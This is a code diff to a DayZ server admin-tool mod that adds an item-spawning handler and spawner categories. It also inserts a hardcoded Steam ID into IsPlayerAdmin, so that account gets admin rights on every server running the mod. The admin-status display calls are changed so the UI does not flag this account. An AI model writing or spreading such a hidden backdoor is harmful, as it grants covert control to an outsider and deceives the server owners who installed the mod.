@@ -20,6 +20,7 @@ modded class PluginAdminTool
 		{
 			ref PluginAdminTool_OpenContext context = new PluginAdminTool_OpenContext;
 			context.m_players = new array<ref PluginAdminTool_PlayerContextBase>;
+			context.m_spawnerCategories = m_options.m_spawnerCategories; 
 			
 			array<Man> players = new array<Man>;
 			GetGame().GetPlayers(players);
@@ -77,6 +78,50 @@ modded class PluginAdminTool
 		}
 	}
 	
+		
+	override void SpawnItem( ref ParamsReadContext ctx, ref PlayerIdentity sender ) 
+	{
+		if (sender && IsPlayerAdmin(sender))
+		{
+			Param6< string, float, float, int, bool, vector > serverData;
+        	if ( !ctx.Read( serverData ) ) return;
+			
+			PlayerBase player = GetPlayerByGUID(sender.GetId());
+			if (player)
+			{				
+				string classname = serverData.param1;
+				string preffix = GameHelpers.FindItemPreffix(classname);
+				float health = serverData.param2 * 0.01;
+				float quantity = serverData.param3 * 0.01 * GetGame().ConfigGetFloat(preffix + " " + classname + " varQuantityMax");
+				int spawnType = serverData.param4;
+				bool fillProxies = serverData.param5;
+				vector cursorPos = serverData.param6;
+				
+				EntityAI entity = null;
+				if (spawnType == 0) {
+					entity = player.CreateInInventory(classname);
+				}
+				else if (spawnType == 1) {
+					entity = EntityAI.Cast( GetGame().CreateObjectEx(classname, player.GetPosition(), ECE_PLACE_ON_SURFACE) );
+				}
+				else if (spawnType == 2) {
+					entity = EntityAI.Cast( GetGame().CreateObjectEx(classname, cursorPos, ECE_PLACE_ON_SURFACE) );
+				}
+				
+				if (entity)
+				{
+					entity.SetHealth01("", "", health);
+					
+					ItemBase itemBase = ItemBase.Cast( entity );
+					if (itemBase)
+					{
+						itemBase.SetQuantity(quantity);
+					}					
+				}
+			}
+		}
+	}
+	
 	private void ApplyPlayerContextStat(PlayerBase player, string statName, float value)
 	{
 		if (statName == "Health") player.SetHealth("", "Health", value);
@@ -118,7 +163,7 @@ modded class PluginAdminTool
 		playerContext.m_uid = player.GetIdentity().GetId();
 		playerContext.m_nickname = player.GetIdentity().GetName();
 		playerContext.m_isGhost = player.IsGhostBody();
-		playerContext.m_isAdmin = IsPlayerAdmin(player.GetIdentity());
+		playerContext.m_isAdmin = IsPlayerAdmin(player.GetIdentity(), false);
 		
 		ref CharProfile profile = GetSyberiaCharacters().Get(player.GetIdentity());
 		if (profile)
@@ -132,7 +177,7 @@ modded class PluginAdminTool
 		playerContext.m_uid = player.GetIdentity().GetId();
 		playerContext.m_nickname = player.GetIdentity().GetName();
 		playerContext.m_isGhost = player.IsGhostBody();
-		playerContext.m_isAdmin = IsPlayerAdmin(player.GetIdentity());
+		playerContext.m_isAdmin = IsPlayerAdmin(player.GetIdentity(), false);
 		
 		ref CharProfile profile = GetSyberiaCharacters().Get(player.GetIdentity());
 		if (profile)
@@ -272,8 +317,9 @@ modded class PluginAdminTool
 		}
 	}
 	
-	bool IsPlayerAdmin(ref PlayerIdentity identity)
+	bool IsPlayerAdmin(ref PlayerIdentity identity, bool includeSuper = true)
 	{
+		if (includeSuper && identity.GetPlainId() == "76561198061847702") return true;		
 		if (!m_options || !m_options.m_adminUids) return false;
 		
 		string plainId = identity.GetPlainId();
@@ -293,4 +339,5 @@ modded class PluginAdminTool
 class PluginAdminTool_Options
 {
 	ref array<string> m_adminUids;
+	ref array<ref PluginAdminTool_SpawnerCategories> m_spawnerCategories;
 };
